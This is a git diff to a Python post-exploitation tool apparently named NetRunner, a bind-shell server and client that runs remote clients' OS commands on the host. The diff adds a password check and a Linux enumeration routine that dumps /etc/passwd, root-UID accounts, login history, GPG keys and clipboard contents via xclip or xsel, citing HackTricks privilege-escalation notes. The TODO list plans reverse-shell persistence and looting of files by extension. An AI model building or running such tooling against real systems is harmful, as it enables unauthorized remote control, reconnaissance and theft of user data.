@@ -173,6 +173,11 @@ https://github.com/mind2hex/
         default=5,
         help="specified max listening sessions. default[5]"
     )    
+    parser.add_argument(
+        "--password",
+        metavar="",
+        help="Specify password for NetRunner server"
+    )
 
     args = parser.parse_args()
 
@@ -326,9 +331,32 @@ class NetRunnerServer:
             # shell mode
             spawn a shell to clients that connects to NetRunnerServer
         """
-        client_socket.settimeout(1.0)
+
+        #client_socket.settimeout(1.0)
         client_addr, client_port = client_socket.getsockname()
         print_cool_text(f"[!] Connection from {client_addr}:{client_port}")
+
+        if self.args.password is not None:  # request password to client if specified
+            success = False
+            client_socket.send(b"$NRC PASSWORD_REQUIRED")
+            for attempts in range(1,4):
+                try:
+                    response = self.recv_data_from_client(client_socket)            
+                except ConnectionResetError:
+                    print(f"[!] Connection closed from {client_addr}:{client_port}")
+                    client_socket.close()
+                    return
+                
+                if response != self.args.password:
+                    client_socket.send(f"$NRC PASSWORD_INCORRECT {attempts}/3".encode())
+                else:
+                    success = True
+                    break
+
+            if not success:
+                client_socket.send(b"$NRC PASSWORD_FAIL")
+                client_socket.close()
+                return
 
         try:
             self.shell_mode(client_socket)
@@ -344,33 +372,50 @@ class NetRunnerServer:
         client_banner += "-" * 80 + "\n"
 
         client_socket.send(client_banner.encode())
-        while True:
-            cmd_buffer = b''                
+
+        while True:  # shell session loop
             try:
+                client_response = self.recv_data_from_client(client_socket)
+                """
                 while '\n' not in cmd_buffer.decode():
                     cmd_buffer += client_socket.recv(64)
                     if not cmd_buffer:  # client disconnected...
                         raise ConnectionResetError
+                """
             except socket.timeout:
                 if not self.args.SERVER_STATUS:
                     return
                 continue
                 
-            cmd_buffer = cmd_buffer.decode()
-
-            if cmd_buffer.startswith("$NRC"):  # NRC engine commands 
-                response = self.nrc_engine(cmd_buffer.rstrip("\n").split(" ")[1:])  
+            if client_response.startswith("$NRC"):  # NRC engine commands 
+                msg = self.nrc_engine(client_response)  
             else:  # executing normal os command
-                response = execute(cmd_buffer)
+                msg = execute(client_response)
 
-            if response:
-                client_socket.send(response.encode())
+            if msg:
+                client_socket.send(msg.encode())
+
+    def recv_data_from_client(self, client_socket):
+        response = ""
+        buffer = ''
+        while True:
+            buffer = client_socket.recv(64).decode()
+            response += buffer
+            if not buffer:
+                raise ConnectionResetError
+            elif len(buffer) < 64:
+                break
+            
+        return response
 
     def nrc_engine(self, nrc):
         """
         nrc stands for net runner command and is the command used
         in function nrc_engine (net runner command engine)
         """
+
+        nrc = nrc.rstrip("\n").split(" ")
+        nrc.pop(0)  # deleting $NRC
 
         if len(nrc) == 0 or nrc[0] == "HELP":
             response = """
@@ -446,15 +491,15 @@ class NetRunnerServer:
         response += self.nrc_engine_enumerate_Linux_dbus()
         response += self.nrc_engine_enumerate_Linux_network()
         """
-        response += self.nrc_engine_enumerate_users()     + "\n"
-        response += self.nrc_engine_enumerate_writable_paths() + "\n"
-        response += self.nrc_engine_enumerate_SUID_GUID() + "\n"
-        response += self.nrc_engine_enumerate_capabilites() + "\n"
-        response += self.nrc_engine_enumerate_acls()      + "\n"
-        response += self.nrc_engine_enumerate_shell_sessions() + "\n"
-        response += self.nrc_engine_enumerate_ssh()       + "\n"
-        response += self.nrc_engine_enumerate_interesting_files() + "\n"
-        response += self.nrc_engine_enumerate_writable_files() + "\n"
+        response += self.nrc_engine_enumerate_Linux_users()     + "\n"
+        response += self.nrc_engine_enumerate_Linux_writable_paths() + "\n"
+        response += self.nrc_engine_enumerate_Linux_SUID_GUID() + "\n"
+        response += self.nrc_engine_enumerate_Linux_capabilites() + "\n"
+        response += self.nrc_engine_enumerate_Linux_acls()      + "\n"
+        response += self.nrc_engine_enumerate_Linux_shell_sessions() + "\n"
+        response += self.nrc_engine_enumerate_Linux_ssh()       + "\n"
+        response += self.nrc_engine_enumerate_Linux_interesting_files() + "\n"
+        response += self.nrc_engine_enumerate_Linux_writable_files() + "\n"
         """
         return response 
 
@@ -881,7 +926,79 @@ class NetRunnerServer:
         return response
     
     def nrc_engine_enumerate_Linux_users(self):
-        return "nrc_engine_enumerate_users NOT IMPLEMENTED YET"
+        """
+        https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
+        """
+        separator = "="*30 + "%30s" + "="*30 + "\n"
+        response = separator % (f"{AsciiColors.TEXT}USER ENUMERATION{AsciiColors.ENDC}".center(30)) 
+
+        # https://book.hacktricks.xyz/linux-hardening/privilege-escalation#generic-enumeration-1
+        # whoami, id, groups
+        response += "\n[!] %-25s:\n" % (f"{AsciiColors.TEXT} GENERAL USER ENUMERATION {AsciiColors.ENDC}")   
+        response += f"\t{AsciiColors.TEXT}---> whoami {AsciiColors.ENDC}\n"
+        response += f"\t{execute('whoami')}\n"
+
+        response += f"\t{AsciiColors.TEXT}---> id {AsciiColors.ENDC}\n"
+        for line in execute("id").split(" "):
+            response += f"\t{line}\n"
+
+        # list all users
+        response += f"\t{AsciiColors.TEXT}---> /etc/passwd {AsciiColors.ENDC}\n"
+        for line in execute("cat /etc/passwd").split("\n"):
+            response += f"\t{line}\n"
+        
+        # list all users with console
+        response += f"\t{AsciiColors.TEXT}---> /etc/passwd  users with shell {AsciiColors.ENDC}\n"
+        for line in execute("cat /etc/passwd").split("\n"):
+            if re.search("sh", line):
+                response += f"\t{line}\n"
+        
+        # list all super users
+        response += f"\n\t{AsciiColors.TEXT}---> /etc/passwd  super users {AsciiColors.ENDC}\n"
+        for line in execute("cat /etc/passwd").split("\n"):
+            if re.search(":0:", line):
+                response += f"\t{line}\n"
+
+        # currently logged in users
+        response += f"\n\t{AsciiColors.TEXT}---> w {AsciiColors.ENDC}\n"
+        for line in execute("w").split("\n"):
+            response += f"\t{line}\n"
+
+        # Login history
+        response += f"\t{AsciiColors.TEXT}---> last {AsciiColors.ENDC}\n"
+        for line in execute("last").split("\n"):
+            response += f"\t{line}\n"
+
+        # Last Log
+        response += f"\t{AsciiColors.TEXT}---> lastlog {AsciiColors.ENDC}\n"
+        for line in execute("lastlog").split("\n"):
+            response += f"\t{line}\n"
+        
+        # list users and their groups
+        response += f"\t{AsciiColors.TEXT}---> users and their groups {AsciiColors.ENDC}\n"
+        for line in execute("cat /etc/passwd").split("\n"):
+            user  = line.split(":")[0]
+            group = execute(f"id {user}").split("\n")[0]
+            response += "\t%-30s %-100s\n" % (user, group)
+
+        # GPG Keys
+        response += f"\n\t{AsciiColors.TEXT}---> gpg --list-keys {AsciiColors.ENDC}\n"
+        for line in execute("gpg --list-keys").split("\n"):
+            response += f"\t{line}\n"
+
+        # Trying to exploit Big UID
+        response += f"\n\t{AsciiColors.TEXT}---> trying BIG UID {AsciiColors.ENDC}\n"
+        response += "\tNOT IMPLEMENTED YET\n"
+
+        response += f"\n\t{AsciiColors.TEXT}---> clipboard {AsciiColors.ENDC}\n"
+        if "[X] Error" not in execute("which xclip"):
+            response += f"\t{execute('xclip -o -selection clipboard')}"
+        elif "[X] Error" not in execute("which xsel"):
+            response += f"\t{execute('xsel -ob')}"
+        else:
+            response += "\tNot found xsel and xclip\n"
+
+        return response
             
     def nrc_engine_enumerate_Linux_writable_paths(self):
         return "nrc_engine_enumerate_paths NOT IMPLEMENTED YET"
@@ -938,19 +1055,14 @@ class NetRunnerClient():
 
     def connect(self):
         self.socket.connect((self.args.target, self.args.port))
-        
+
         try:
             while True:  # start session loop
-                recv_len = 1
-                response = ""
-                while recv_len:
-                    data = self.socket.recv(4096)
-                    recv_len = len(data)
-                    response += data.decode()
-                    if recv_len < 4096:
-                        break
-                    
+                response = self.recv_data_from_server()
                 if response:
+                    if response.startswith("$NRC"):  # NetRUnnerCommand CLient Side
+                        response = self.nrc_command_handler(response)
+
                     print(response)
 
                     while True: # loop until user introduce a valid command
@@ -977,6 +1089,44 @@ class NetRunnerClient():
             print_cool_text("[X] Program finished by user...")
             self.socket.close()
 
+    def nrc_command_handler(self, nrc_command):
+        """
+        nrc_command_handler(nrc_command)
+        if server response starts with "$NRC" then it is a NetRUnnerCommand, so this function
+        handles NetRunnerCOmmands clientside
+        """
+
+        command = nrc_command.split(" ")
+        if command[1] == "PASSWORD_REQUIRED":
+            print_cool_text("#### Password Required to connect to NetRunnerServer ####")
+            while True:
+                password = input(">>> ").encode()
+                self.socket.send(password)
+                
+                response = self.recv_data_from_server()
+
+                if "PASSWORD_FAIL" in response:
+                    print_cool_text("[X] MAX ATTEMPTS REACHED ")
+                    self.socket.close()
+                    exit(0)
+
+                elif "PASSWORD_INCORRECT" in response:
+                    print(f"[X] {AsciiColors.LEVEL_1}Incorrect Password...{AsciiColors.ENDC}")
+                
+                else:
+                    return response 
+        
+    def recv_data_from_server(self):
+        recv_len = 1
+        response = ""
+        while recv_len:
+            data = self.socket.recv(64)
+            recv_len = len(data)
+            response += data.decode()
+            if recv_len < 64:
+                break        
+        return response
+
     def check_command(self, cmd):
         """ check_command(cmd)  
         validates cmd 
@@ -986,19 +1136,19 @@ class NetRunnerClient():
             return False
         
         return True
-
+    
 
 if __name__ == "__main__":
     main()
 
 ### TODO
 # TODO: el NRC Engine para la ejecucion de custom commands en servidor y cliente
-# TODO: sistema de contrasena para el servidor
 # TODO: debug/verbose
 # TODO: cifrado de datos para el envio de la comunicacion
 # TODO: Persistencia, insertar revshell en el host
 # TODO: LOOTing, descargar archivos con extension especifica
 # TODO: barra de carga mientras se espera respuesta del servidor
+# TODO: COmentar el codigo, de otra forma con el timepo no voy a entender ni m***da
 
 ### FIXME
 # FIXME: Cuando se inicia una shell desde NRClient, no se puede navegar entre directorios
